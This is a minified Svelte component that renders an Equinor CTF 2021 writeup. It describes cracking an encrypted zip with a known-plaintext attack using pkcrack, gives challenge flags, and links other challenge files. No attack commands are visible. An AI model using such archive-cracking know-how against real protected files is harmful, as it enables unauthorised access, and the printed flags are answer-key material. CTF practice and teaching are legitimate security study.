`),At=s(yr,"IMG",{src:!0}),yr.forEach(a),Co=h(ae),Ke=s(ae,"P",{});var kr=i(Ke);To=o(kr,`Downloads
`),$=s(kr,"A",{href:!0,rel:!0,class:!0,target:!0});var Ts=i($);Oo=o(Ts,"challenge.zip"),Ts.forEach(a),kr.forEach(a),ae.forEach(a),Ea=h(e),k=s(e,"P",{});var le=i(k);Ao=o(le,"Looking at the given image above, we can see that the zip file "),Dt=s(le,"CODE",{});var Os=i(Dt);Do=o(Os,"challenge.zip"),Os.forEach(a),zo=o(le," contains 2 files: "),zt=s(le,"CODE",{});var As=i(zt);So=o(As,"flag.txt"),As.forEach(a),Lo=o(le," and "),St=s(le,"CODE",{});var Ds=i(St);Ro=o(Ds,"hint.txt"),Ds.forEach(a),Fo=o(le," (which we know the content of):"),le.forEach(a),ya=h(e),Ee=s(e,"PRE",{class:!0});var Ei=i(Ee);Ei.forEach(a),ka=h(e),Q=s(e,"P",{});var Ia=i(Q);Ho=o(Ia,"Downloading the zip file "),Lt=s(Ia,"CODE",{});var zs=i(Lt);Io=o(zs,"challenge.zip"),zs.forEach(a),Uo=o(Ia," and trying to unzip it prompts us for a password, which we know isn\u2019t bruteforce able as it will take to long."),Ia.forEach(a),Pa=h(e),D=s(e,"P",{});var We=i(D);$o=o(We,"After a quick google search we see that there\u2019s something called a "),Rt=s(We,"CODE",{});var Ss=i(Rt);Ko=o(Ss,"known plaintext attack"),Ss.forEach(a),Mo=o(We,", which means that one can break the cipher if one knows a part of the encrypted data. (which in this case, we do with "),Ft=s(We,"CODE",{});var Ls=i(Ft);Bo=o(Ls,"hint.txt"),Ls.forEach(a),Vo=o(We,")"),We.forEach(a),qa=h(e),T=s(e,"P",{});var Ce=i(T);Go=o(Ce,"Luckily someone has already implemented the algorithm that was developed by Eli Biham and Paul Kocher on a "),Ht=s(Ce,"CODE",{});var Rs=i(Ht);jo=o(Rs,"known plaintext attack"),Rs.forEach(a),Wo=o(Ce," on zip files described in "),K=s(Ce,"A",{href:!0,class:!0,target:!0,rel:!0});var Fs=i(K);No=o(Fs,"this paper (Postscript, 80k)"),Fs.forEach(a),Yo=o(Ce,` (I didn\u2019t read this however).
The program can be found here: `),M=s(Ce,"A",{href:!0,rel:!0,class:!0,target:!0});var Hs=i(M);Qo=o(Hs,"https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html"),Hs.forEach(a),Ce.forEach(a),Ca=h(e),Me=s(e,"P",{});var Is=i(Me);Zo=o(Is,"With the implementation in box, solving this challenge has become just as easy as running the program:"),Is.forEach(a),Ta=h(e),ye=s(e,"PRE",{class:!0});var yi=i(ye);yi.forEach(a),Oa=h(e),Be=s(e,"P",{});var Us=i(Be);Jo=o(Us,"and"),Us.forEach(a),Aa=h(e),ke=s(e,"PRE",{class:!0});var ki=i(ke);ki.forEach(a),Da=h(e),B=s(e,"P",{});var Vt=i(B);Xo=o(Vt,"Opening the decrypted zip file "),It=s(Vt,"CODE",{});var $s=i(It);er=o($s,"decrypted.zip"),$s.forEach(a),tr=o(Vt," and we get the flag: "),Ut=s(Vt,"CODE",{});var Ks=i(Ut);ar=o(Ks,"EPT{d1d_y0u_gu3$$_th3_p4$$w0rd_0r_pl41nt3xt_cr4ck_1t?}"),Ks.forEach(a),Vt.forEach(a),za=h(e),Pe=s(e,"H2",{id:!0});var Ms=i(Pe);Ve=s(Ms,"A",{href:!0});var Bs=i(Ve);lr=o(Bs,"Crypto/Arbitrary Encoding System"),Bs.forEach(a),Ms.forEach(a),Sa=h(e),z=s(e,"BLOCKQUOTE",{});var Ne=i(z);$t=s(Ne,"P",{});var Vs=i($t);or=o(Vs,`Author: null
20 solves / 413 points`),Vs.forEach(a),rr=h(Ne),Kt=s(Ne,"P",{});var Gs=i(Kt);sr=o(Gs,"I heard that all the cool kids down the street had switched to this new cipher. Think it was called Arbitrary Encoding System or something\u2026"),Gs.forEach(a),ir=h(Ne),Z=s(Ne,"P",{});var Gt=i(Z);nr=o(Gt,`Downloads
`),V=s(Gt,"A",{href:!0,rel:!0,class:!0,target:!0});var js=i(V);cr=o(js,"aes.py"),js.forEach(a),pr=o(Gt," > "),G=s(Gt,"A",{href:!0,rel:!0,class:!0,target:!0});var Ws=i(G);fr=o(Ws,"flag.png.enc"),Ws.forEach(a),Gt.forEach(a),Ne.forEach(a),La=h(e),J=s(e,"P",{});var Ua=i(J);hr=o(Ua,"Read this writeup for some good shit explanations: "),j=s(Ua,"A",{href:!0,rel:!0,class:!0,target:!0});var Ns=i(j);dr=o(Ns,"https://github.com/williamsolem/writeups/tree/main/EquinorCTF#arbitrary-encoding-system"),Ns.forEach(a),ur=o(Ua,". Thank you!"),Ua.forEach(a),Ra=h(e),qe=s(e,"P",{});var Pr=i(qe);xr=o(Pr,"The flag is: "),Mt=s(Pr,"CODE",{});var Ys=i(Mt);_r=o(Ys,"EPT{mode_of_operation_is_important}"),Ys.forEach(a),Pr.forEach(a),this.h()},h(){p(C,"href","#beginnerah-64"),p(b,"id","beginnerah-64"),p(R,"href","http://io.ept.gg:30071/"),p(R,"rel","noopener"),p(R,"class","text-link"),p(R,"target","_blank"),p(re,"class","language-sh"),p(F,"href","https://httpd.apache.org/security/vulnerabilities_24.html"),p(F,"rel","noopener"),p(F,"class","text-link"),p(F,"target","_blank"),p(se,"class","language-sh"),p(Se,"href","#beginnerbaby2"),p(ne,"id","beginnerbaby2"),p(H,"href","https://ctf.equinor.com/uploads?key=a18b515b8e3e405195ec99d8478f7dbfd137e06fdd0e8de64fe2e4eca7df0280%2Fbaby2"),p(H,"rel","noopener"),p(H,"class","text-link"),p(H,"target","_blank"),p(ce,"class","language-shell"),p(pe,"class","language-shell"),p(fe,"class","language-c="),p(he,"class","language-c="),Cr(ft.src,Tr="https://i.imgur.com/rVwbbLO.png")||p(ft,"src",Tr),p(de,"class","rehype-figure"),p(ue,"class","language-python="),p(Ie,"href","#cryptoreally-solid-algebra"),p(_e,"id","cryptoreally-solid-algebra"),p(I,"href","https://ctf.equinor.com/uploads?key=d3f47162a9d3619ec8a0f08c44dc72b0758a312b92e26159430d287e406c409a%2Frsa.py"),p(I,"rel","noopener"),p(I,"class","text-link"),p(I,"target","_blank"),p(U,"href","https://ctf.equinor.com/uploads?key=55221d9f16557f33fa3699169f3b8a1ea78211f4d398ffea5098108f1088a357%2Foutput.log"),p(U,"rel","noopener"),p(U,"class","text-link"),p(U,"target","_blank"),p(be,"class","language-python3="),p(me,"class","language-undefined"),p(ge,"class","language-python="),p(Ue,"href","#miscuncrackable-zip"),p(we,"id","miscuncrackable-zip"),Cr(At.src,Or="https://i.imgur.com/fyP4l3W.png")||p(At,"src",Or),p($,"href","https://ctf.equinor.com/uploads?key=9a0d3c9318f8e34e36ec516c7a34d92efd86ae56d14d713382444de6d753a18d%2Fchallenge.zip"),p($,"rel","noopener"),p($,"class","text-link"),p($,"target","_blank"),p(Ee,"class","language-undefined"),p(K,"href","ftp://utopia.hacktic.nl/pub/crypto/cracking/pkzip.ps.gz"),p(K,"class","text-link"),p(K,"target","_blank"),p(K,"rel","noopener"),p(M,"href","https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html"),p(M,"rel","noopener"),p(M,"class","text-link"),p(M,"target","_blank"),p(ye,"class","language-shell"),p(ke,"class","language-shell"),p(Ve,"href","#cryptoarbitrary-encoding-system"),p(Pe,"id","cryptoarbitrary-encoding-system"),p(V,"href","https://ctf.equinor.com/uploads?key=4012c19f43295280bc5eb2a324b824d16910a9d4c6d554a6c64fc08b565a25a3%2Faes.py"),p(V,"rel","noopener"),p(V,"class","text-link"),p(V,"target","_blank"),p(G,"href","https://ctf.equinor.com/uploads?key=23c3bb3c9044a6d201c6d5347471ab131bcb4f4f5f823d011a1eb0b81bd333f7%2Fflag.png.enc"),p(G,"rel","noopener"),p(G,"class","text-link"),p(G,"target","_blank"),p(j,"href","https://github.com/williamsolem/writeups/tree/main/EquinorCTF#arbitrary-encoding-system"),p(j,"rel","noopener"),p(j,"class","text-link"),p(j,"target","_blank")},m(e,n){c(e,u,n),t(u,q),c(e,L,n),c(e,b,n),t(b,C),t(C,oe),c(e,W,n),c(e,d,n),t(d,_),t(_,Oe),t(_,Ye),t(Ye,$a),t(_,Ka),t(d,Ma),t(d,Qe),t(Qe,Ba),t(d,Va),t(d,Ae),t(Ae,Ga),t(Ae,Ze),t(Ze,ja),t(d,Wa),t(d,De),t(De,Na),t(De,R),t(R,Ya),c(e,jt,n),c(e,ze,n),t(ze,Qa),c(e,Wt,n),c(e,re,n),re.innerHTML=Xs,c(e,Nt,n),c(e,x,n),t(x,Za),t(x,F),t(F,Ja),t(x,Xa),t(x,Je),t(Je,el),t(x,tl),t(x,Xe),t(Xe,al),t(x,ll),t(x,et),t(et,ol),t(x,rl),t(x,tt),t(tt,sl),t(x,il),t(x,at),t(at,nl),t(x,cl),t(x,lt),t(lt,pl),t(x,fl),c(e,Yt,n),c(e,O,n),t(O,hl),t(O,ot),t(ot,dl),t(O,ul),t(O,rt),t(rt,xl),t(O,_l),c(e,Qt,n),c(e,se,n),se.innerHTML=ei,c(e,Zt,n),c(e,ie,n),t(ie,bl),t(ie,st),t(st,ml),c(e,Jt,n),c(e,ne,n),t(ne,Se),t(Se,gl),c(e,Xt,n),c(e,w,n),t(w,it),t(it,vl),t(w,wl),t(w,nt),t(nt,El),t(w,yl),t(w,ct),t(ct,kl),t(w,Pl),t(w,Le),t(Le,ql),t(Le,H),t(H,Cl),c(e,ea,n),c(e,N,n),t(N,Tl),t(N,pt),t(pt,Ol),t(N,Al),c(e,ta,n),c(e,ce,n),ce.innerHTML=ti,c(e,aa,n),c(e,Re,n),t(Re,Dl),c(e,la,n),c(e,pe,n),pe.innerHTML=ai,c(e,oa,n),c(e,Fe,n),t(Fe,zl),c(e,ra,n),c(e,fe,n),fe.innerHTML=li,c(e,sa,n),c(e,He,n),t(He,Sl),c(e,ia,n),c(e,he,n),he.innerHTML=oi,c(e,na,n),c(e,de,n),t(de,ft),c(e,ca,n),c(e,ue,n),ue.innerHTML=ri,c(e,pa,n),c(e,xe,n),t(xe,Ll),t(xe,ht),t(ht,Rl),c(e,fa,n),c(e,_e,n),t(_e,Ie),t(Ie,Fl),c(e,ha,n),c(e,A,n),t(A,dt),t(dt,Hl),t(A,Il),t(A,ut),t(ut,Ul),t(A,$l),t(A,Y),t(Y,Kl),t(Y,I),t(I,Ml),t(Y,Bl),t(Y,U),t(U,Vl),c(e,da,n),c(e,E,n),t(E,Gl),t(E,xt),t(xt,jl),t(E,Wl),t(E,_t),t(_t,Nl),t(E,Yl),t(E,bt),t(bt,Ql),t(E,Zl),c(e,ua,n),c(e,be,n),be.innerHTML=si,c(e,xa,n),c(e,me,n),me.innerHTML=ii,c(e,_a,n),c(e,v,n),t(v,Jl),t(v,mt),t(mt,Xl),t(v,eo),t(v,gt),t(gt,to),t(v,ao),t(v,vt),t(vt,lo),t(v,oo),t(v,wt),t(wt,ro),t(v,so),c(e,ba,n),c(e,m,n),t(m,io),t(m,Et),t(Et,no),t(m,co),t(m,yt),t(yt,po),t(m,fo),t(m,kt),t(kt,ho),t(m,uo),t(m,Pt),t(Pt,xo),t(m,_o),t(m,qt),t(qt,bo),t(m,mo),c(e,ma,n),c(e,ge,n),ge.innerHTML=ni,c(e,ga,n),c(e,ve,n),t(ve,go),t(ve,Ct),t(Ct,vo),c(e,va,n),c(e,we,n),t(we,Ue),t(Ue,wo),c(e,wa,n),c(e,y,n),t(y,Tt),t(Tt,Eo),t(y,yo),t(y,Ot),t(Ot,ko),t(y,Po),t(y,$e),t($e,qo),t($e,At),t(y,Co),t(y,Ke),t(Ke,To),t(Ke,$),t($,Oo),c(e,Ea,n),c(e,k,n),t(k,Ao),t(k,Dt),t(Dt,Do),t(k,zo),t(k,zt),t(zt,So),t(k,Lo),t(k,St),t(St,Ro),t(k,Fo),c(e,ya,n),c(e,Ee,n),Ee.innerHTML=ci,c(e,ka,n),c(e,Q,n),t(Q,Ho),t(Q,Lt),t(Lt,Io),t(Q,Uo),c(e,Pa,n),c(e,D,n),t(D,$o),t(D,Rt),t(Rt,Ko),t(D,Mo),t(D,Ft),t(Ft,Bo),t(D,Vo),c(e,qa,n),c(e,T,n),t(T,Go),t(T,Ht),t(Ht,jo),t(T,Wo),t(T,K),t(K,No),t(T,Yo),t(T,M),t(M,Qo),c(e,Ca,n),c(e,Me,n),t(Me,Zo),c(e,Ta,n),c(e,ye,n),ye.innerHTML=pi,c(e,Oa,n),c(e,Be,n),t(Be,Jo),c(e,Aa,n),c(e,ke,n),ke.innerHTML=fi,c(e,Da,n),c(e,B,n),t(B,Xo),t(B,It),t(It,er),t(B,tr),t(B,Ut),t(Ut,ar),c(e,za,n),c(e,Pe,n),t(Pe,Ve),t(Ve,lr),c(e,Sa,n),c(e,z,n),t(z,$t),t($t,or),t(z,rr),t(z,Kt),t(Kt,sr),t(z,ir),t(z,Z),t(Z,nr),t(Z,V),t(V,cr),t(Z,pr),t(Z,G),t(G,fr),c(e,La,n),c(e,J,n),t(J,hr),t(J,j),t(j,dr),t(J,ur),c(e,Ra,n),c(e,qe,n),t(qe,xr),t(qe,Mt),t(Mt,_r)},p:Ri,d(e){e&&a(u),e&&a(L),e&&a(b),e&&a(W),e&&a(d),e&&a(jt),e&&a(ze),e&&a(Wt),e&&a(re),e&&a(Nt),e&&a(x),e&&a(Yt),e&&a(O),e&&a(Qt),e&&a(se),e&&a(Zt),e&&a(ie),e&&a(Jt),e&&a(ne),e&&a(Xt),e&&a(w),e&&a(ea),e&&a(N),e&&a(ta),e&&a(ce),e&&a(aa),e&&a(Re),e&&a(la),e&&a(pe),e&&a(oa),e&&a(Fe),e&&a(ra),e&&a(fe),e&&a(sa),e&&a(He),e&&a(ia),e&&a(he),e&&a(na),e&&a(de),e&&a(ca),e&&a(ue),e&&a(pa),e&&a(xe),e&&a(fa),e&&a(_e),e&&a(ha),e&&a(A),e&&a(da),e&&a(E),e&&a(ua),e&&a(be),e&&a(xa),e&&a(me),e&&a(_a),e&&a(v),e&&a(ba),e&&a(m),e&&a(ma),e&&a(ge),e&&a(ga),e&&a(ve),e&&a(va),e&&a(we),e&&a(wa),e&&a(y),e&&a(Ea),e&&a(k),e&&a(ya),e&&a(Ee),e&&a(ka),e&&a(Q),e&&a(Pa),e&&a(D),e&&a(qa),e&&a(T),e&&a(Ca),e&&a(Me),e&&a(Ta),e&&a(ye),e&&a(Oa),e&&a(Be),e&&a(Aa),e&&a(ke),e&&a(Da),e&&a(B),e&&a(za),e&&a(Pe),e&&a(Sa),e&&a(z),e&&a(La),e&&a(J),e&&a(Ra),e&&a(qe)}}}function Ii(Te){let u,q,L,b,C;const oe=[Te[0],Js];let W={$$slots:{default:[Hi]},$$scope:{ctx:Te}};for(let d=0;d<oe.length;d+=1)W=qr(W,oe[d]);return b=new Fi({props:W}),{c(){u=r("figure"),q=r("img"),Ti(b.$$.fragment),this.h()},l(d){u=s(d,"FIGURE",{class:!0});var _=i(u);q=s(_,"IMG",{src:!0}),_.forEach(a),Oi(b.$$.fragment,d),this.h()},h(){Cr(q.src,L="https://i.imgur.com/fyP4l3W.png")||p(q,"src",L),p(u,"class","rehype-figure")},m(d,_){c(d,u,_),t(u,q),Ai(b,d,_),C=!0},p(d,[_]){const Oe=_&1?Di(oe,[_&1&&Qs(d[0]),_&0&&Qs(Js)]):{};_&2&&(Oe.$$scope={dirty:_,ctx:d}),b.$set(Oe)},i(d){C||(zi(b.$$.fragment,d),C=!0)},o(d){Si(b.$$.fragment,d),C=!1},d(d){d&&a(u),Li(b,d)}}}const Js={title:"Equinor CTF 2021 Writeup",date:"2021-10-31",category:"writeup",tags:["equinor-ctf","ctf"]};function Ui(Te,u,q){return Te.$$set=L=>{q(0,u=qr(qr({},u),Zs(L)))},u=Zs(u),[u]}class Mi extends Pi{constructor(u){super(),qi(this,u,Ui,Ii,Ci,{})}}export{Mi as default,Js as metadata};
